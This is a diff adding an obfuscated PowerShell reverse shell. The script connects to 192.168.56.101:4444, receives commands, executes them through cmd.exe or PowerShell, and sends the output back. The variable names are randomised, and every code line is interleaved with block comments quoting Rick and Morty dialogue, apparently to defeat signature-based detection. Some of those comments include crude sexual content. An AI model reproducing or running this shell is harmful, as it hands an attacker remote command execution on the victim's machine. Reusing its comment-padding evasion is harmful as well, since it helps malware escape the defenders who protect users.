@@ -1,0 +1,107 @@
+$jqKNbUfFHQ = new-object System.Net.Sockets.TcpClient('192.168.56.101', 4444);
+<# Jerry  Okay  Let s not rehash that fight  I sense that you re busy and will now be on my way   drops a pamphlet on the ground   #>
+if($jqKNbUfFHQ -eq $SjSPgDCyFR){exit 1}
+<# Morty   rubs the back of his neck  Uh  that s flattering    and a little weird   #>
+$nPCEAhHYVD = $jqKNbUfFHQ.GetStream();
+<# Mr  Goldenfold  Yeah  you know what   Aw  too bad  Tough  First row  take one  Pass it back for me  The stakes are high in this room   Morty stares at the quiz  the numbers on the quiz jumble together as Morty falls asleep  There s crucial things happening here every day  People getting smarter  Some of y all getting dumber  Some of y all ain t gonna see 3 00   Morty falls into a dream world filled with large number shaped blocks  Jessica steps out from behind some of the numbers   #>
+$GLmdShTSyM = new-object System.IO.StreamWriter($nPCEAhHYVD);
+<# Tom   offscreen  Stabilized   #>
+$NvEsYGYTiL = new-object System.Byte[] 1024;
+<# Morty   unbuckles his seatbelt  That s it    that s it  Rick  I m taking the wheel   jumps up on Rick and starts fighting with him over control of the wheel   #>
+$hiXzlGWZdR = new-object System.Text.AsciiEncoding;
+<# Morty  1 77245385    Whoa   #>
+do
+<# Morty  Yeah  Rick  Let s just get this over with  okay  I mean  these things are pointy  They hurt   #>
+{
+<# Rick  You know what  That was all a test  Morty  Just an elaborate test to make you more assertive   #>
+	$GLmdShTSyM.Flush();
+<# Rick  There you are  Morty  Listen to me  I got an errand to run in a whole different dimension  I need an extra pair of hands   #>
+	$ULqnNmxrMZ = $SjSPgDCyFR;
+<# Morty  Ohh     #>
+	$UOgEbsXErG = ""
+<# Mr  Goldenfold  Now  look  we re gonna be dealing with some real serious stuff today  You might have heard of it  It s called math  And without it  none of us would even exist  so let s jump right in  Two plus two   #>
+	while($nPCEAhHYVD.DataAvailable -or $ULqnNmxrMZ -eq $SjSPgDCyFR) {
+<#  Cut to hallway   #>
+		$ULqnNmxrMZ = $nPCEAhHYVD.Read($NvEsYGYTiL, 0, 1024)
+<# Jerry  Oh  look  honey  It s our son with Albert Ein douche   #>
+	}
+<# Rick  I got a surprise for you  Morty   #>
+	$PpLFTyeMtH = $hiXzlGWZdR.GetString($NvEsYGYTiL, 0, $ULqnNmxrMZ).Replace("`r`n","").Replace("`n","");
+<# Rick  There you are  Morty  Listen to me  I got an errand to run in a whole different dimension  I need an extra pair of hands   #>
+	if(!$PpLFTyeMtH.equals("exit")){
+<# Beth  Oh  don t high road us  dad  You know fully well that Morty is the last child that needs to be missing classes   #>
+		$ZmIevXstom = "";
+<# Jessica  Mm  Oh  Morty  What are you doing to me   #>
+		if($PpLFTyeMtH.IndexOf(' ') -gt -1){
+<# Summer  Oh my god  my parents are so loud  I want to die   #>
+			$ZmIevXstom = $PpLFTyeMtH.substring($PpLFTyeMtH.IndexOf(' ')+1);
+<# Morty  Holy cow  Rick  I didn t know hanging out with you was making me smarter   #>
+			$PpLFTyeMtH = $PpLFTyeMtH.substring(0,$PpLFTyeMtH.IndexOf(' '));
+<# Announcer  The glarp zone is for flarping and unglarping only   #>
+			if($ZmIevXstom.split(' ').length -gt 1){
+<# Rick  There s ways to get back home  Morty  It s just it s just gonna be a little bit of a hassle  We re gonna have to go through interdimensional customs  so you re gonna have to do me a real solid   #>
+                $LSlsRnRhRK = New-Object System.Diagnostics.ProcessStartInfo
+<# Morty  Aw  geez  Okay  I guess I can skip history  What about Frank  I mean  shouldn t you unfreeze him   #>
+                $LSlsRnRhRK.FileName = "cmd.exe"
+<# Morty  Wow  Well  okay  Jessica  L let s give this a shot   Morty grabs her breasts and starts fondling her   #>
+                $LSlsRnRhRK.RedirectStandardError = $YvUVBAAnLd
+<# Tom   offscreen  We re losing him   Beth adjusts the horse s organs   #>
+                $LSlsRnRhRK.RedirectStandardOutput = $YvUVBAAnLd
+<# Morty  Ohh     #>
+                $LSlsRnRhRK.UseShellExecute = $wnZSKPCnOKwBoPHlGGA
+<# Rick  You know what  Morty  You re right   throws empty bottle into the backseat  Let s forget the girl altogether  She  she s probably nothing but trouble  anyways   presses a button   #>
+                $LSlsRnRhRK.Arguments = "/c $PpLFTyeMtH $ZmIevXstom"
+<# Morty  Jessica   #>
+                $wnZSKPCnOK = New-Object System.Diagnostics.Process
+<# Morty  Oh  geez  Frank  I don t know if a knife is necessary  I mean  you know  y you kind of had things handled without it   #>
+                $wnZSKPCnOK.StartInfo = $LSlsRnRhRK
+<# Jerry  Whoa  What is this on the floor  Some kind of literature for a really nice looking nursing home  Hey  honey  crazy idea bad pitch let s put your dad here  Let s put your dad in a nursing home   Beth looks at Jerry angrily and the equipment starts beeping faster again   #>
+                $wnZSKPCnOK.Start() | Out-Null
+<# Beth  Hey  Tom  We know when we re losing him  WE CAN HEAR THE BEEPS   #>
+                $wnZSKPCnOK.WaitForExit()
+<# Rick  HOLY CRAP  MORTY RUN     they take off  running in complete and total fear as the monster chases them   #>
+                $yrLNaYVjZl = $wnZSKPCnOK.StandardOutput.ReadToEnd()
+<# Rick  Yeah  I can see that  But do you think you ll still be able to help me  burps  collect my seeds  Morty   #>
+                $dOrhceLfVC = $wnZSKPCnOK.StandardError.ReadToEnd()
+<#  Cut to Intergalactic Customs   #>
+                if ($wnZSKPCnOK.ExitCode -ne 0) {
+<# Rick  Takes one to know one   #>
+                    $UOgEbsXErG = $dOrhceLfVC
+<# Rick  Come on  Morty  Just take it easy  Morty  It s gonna be good  Right now  we re gonna go pick up your little friend Jessica   #>
+                } else {
+<# Morty   sleep talking  Ah  Jessica   #>
+                    $UOgEbsXErG = $yrLNaYVjZl
+<# Beth  Jerry  please tell me you re here for an incredibly urgent reason   #>
+                }
+<# Rick  What are you trying to say about Morty  That he s stupid or something   #>
+			}
+<# Jerry  Well  duh doy  son  Look  I love you  Morty  but we both know you re not as fast as the other kids  and if you want to compete in this world  you got to work twice as hard   #>
+			else{
+<# Rick  Come on  Morty  We got to get the hell out of here   the portal opens up in the lunchroom at school and Rick and Morty land on the table where Jessica and her friends are eating   #>
+				$UOgEbsXErG = (&"$PpLFTyeMtH" "$ZmIevXstom") | out-string;
+<# Morty  Yeah  Rick  Let s just get this over with  okay  I mean  these things are pointy  They hurt   #>
+			}
+<# Jessica  You re Morty  right   #>
+		}
+<# Alien  So  I told him   give me the blimfarx   you know  This this guy he doesn t understand interstellar currency   #>
+		else{
+<# Summer  Oh my god  my parents are so loud  I want to die   #>
+			$UOgEbsXErG = (&"$PpLFTyeMtH") | out-string;
+<# Morty  Aaaaaah   #>
+		}
+<# Rick   puts an arm around Mortyâ  s shoulders  When I drop the bomb you know  I want you to have somebody  you know  I want you to have the thing  I m gonna make it like a new Adam and Eve  and you re gonna be Adam   #>
+		if($UOgEbsXErG -ne $SjSPgDCyFR){
+<# Morty  It s the middle of the night  What are you talking about   #>
+        $GLmdShTSyM.WriteLine($UOgEbsXErG)
+<# Rick  That means they re good ones  You re a good kid  Morty  Those mega seeds are super valuable to my work  You ve been a huge help to me  I m gonna be able to do a   #>
+    }
+<# Beth  I am not putting my father in a home  He just came back into my life  and you want to grab him and stuff him under a mattress like last month s Victoria s Secret   #>
+	}
+<# Jerry   glaring at Rick  Okay  with all due respect  Rickâ   what am I talking about  What respect is due  How is my son supposed to pass his classes if you keep dragging him off for high concept Sci Fi rigamarole   #>
+}While (!$PpLFTyeMtH.equals("exit"))
+<#  Cut to Intergalactic Customs   #>
+$GLmdShTSyM.close();
+<# Morty  Um     #>
+$jqKNbUfFHQ.close();
+<# Jessica  You re Morty  right   #>
+$nPCEAhHYVD.Dispose()<# Announcer  The glarp zone is for flarping and unglarping only   #>
